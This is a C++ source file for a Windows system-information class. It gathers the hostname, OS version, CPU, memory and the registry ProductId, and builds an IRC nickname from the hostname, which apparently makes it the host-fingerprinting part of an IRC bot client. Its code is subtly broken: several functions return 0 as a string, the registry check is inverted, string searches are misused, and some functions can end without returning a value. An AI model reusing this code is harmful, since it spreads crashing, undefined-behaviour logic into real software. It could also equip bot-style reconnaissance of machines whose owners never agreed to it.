#include "SysInfo.h"

// Not entirely complete, matches most common found versions
std::string SysInfo::getOSVersionName() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*) &osvi);

    switch(osvi.dwMajorVersion) {
		case 5:
            switch(osvi.dwMinorVersion) {
                case 0:
                    return "Windows 2000";

				case 1:
                    return "Windows XP";

                case 2:
					if(GetSystemMetrics(SM_SERVERR2) == 0)
						return "Windows Server 2003";
					if(osvi.wSuiteMask & VER_SUITE_WH_SERVER)
						return "Windows Home Server";
                    break;
            }
            break;

        case 6:
            switch(osvi.dwMinorVersion) {
                case 0:
                    if(osvi.wProductType == VER_NT_WORKSTATION)
                        return "Windows Vista";
                    if(osvi.wProductType != VER_NT_WORKSTATION)
                        return "Windows Server 2008";
                    break;

                case 1:
                    if(osvi.wProductType == VER_NT_WORKSTATION)
                        return "Windows 7";
                    if(osvi.wProductType != VER_NT_WORKSTATION)
                        return "Windows Server 2008 R2";
                    break;
                case 2:
                    if(osvi.wProductType == VER_NT_WORKSTATION)
                        return "Windows 8";
                    if(osvi.wProductType != VER_NT_WORKSTATION)
                        return "Windows Server 2012";
                    break;
                case 3:
                    if(osvi.wProductType == VER_NT_WORKSTATION)
                        return "Windows 8.1";
                    if(osvi.wProductType != VER_NT_WORKSTATION)
                        return "Windows Server 2012 R2";
                break;
            }
            break;
    }
    return 0;
}

std::string SysInfo::getShortOSVersionName() {
	std::string shortName = getOSVersionName();
	int index;	

	index = shortName.find_first_of("Windows");
	if(index != std::string::npos)
		shortName.replace(index, index +7, "Win");

	index = shortName.find_first_of("200");
	if(index != std::string::npos)
		shortName.replace(index, index +3, "'0");
	
	// Remove all spaces
	index = shortName.find_first_of(" ");
	while(index != std::string::npos) {
		shortName.replace(index, 1, "" );
		index = shortName.find(" ", index +1 );
	}

	return shortName;
}

std::string SysInfo::getHostname() {
    char buf[32];
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    gethostname(buf, sizeof(buf));
    
    return std::string(buf);
}

std::string SysInfo::getCPUArch() {
    SYSTEM_INFO siSysInfo;
    
    // Copy the hardware information to the SYSTEM_INFO structure. 
    GetSystemInfo(&siSysInfo); 
    
    if(siSysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        return "x86";
    else if(siSysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        return "x86_64";
    else if(siSysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
        return "Intel Itanium";
    else
        return "Undefined";
    return 0;
}

int SysInfo::getCPUCount() {
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    return siSysInfo.dwNumberOfProcessors;
}

std::string SysInfo::getMemory() {
    // if > vista
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof (statex);
    GlobalMemoryStatusEx(&statex);

    std::vector<std::string> sizes {"KB", "MB", "GB", "TB"};
	DWORDLONG curSize = statex.ullTotalPhys;
	for (auto it = sizes.begin(); it != sizes.end(); ++it) {
	 	curSize /= 1024;
		if(curSize < 1024) 
			return std::to_string(curSize).append( sizes[std::distance(sizes.begin(), it)] );
	}

    // Convert to GB
   

    // IF > Vista
    // long totalMemoryInKilobytes;
    // GetPhysicallyInstalledSystemMemory(&totalMemoryInKilobytes);

    // return ltoa(totalMemoryInKilobytes);
}

std::string SysInfo::getWindowsProductKey() {
    HKEY key;
    
    // Location for Windows NT, 2000 and Up (I think)
    if(RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", &key) != ERROR_SUCCESS) {
        char value[32];
        DWORD value_length = (DWORD) 32;
        RegQueryValueEx(key, "ProductId", NULL, NULL, (LPBYTE)&value, &value_length );
        return std::string(value);
    }
}


std::string SysInfo::SysInfoString() {
	std::ostringstream ss;

	ss <<
		"Hostname: " << getHostname() << " | " <<
		"OS Ver: " << getOSVersionName() << " | " <<
		"Memory: " << getMemory() << " | " <<
		"CPU Cores: " << getCPUCount() << " | " <<
		"CPU Arch: " << getCPUArch();

	return ss.str();
}

std::string SysInfo::generateIRCNickname() {
	std::ostringstream ss;
    srand(time(0));

    ss << "[" << (rand() % 999 + 1) << "]";
    ss << "[" << getHostname().substr(0, 9) << "]";

	return ss.str();
}
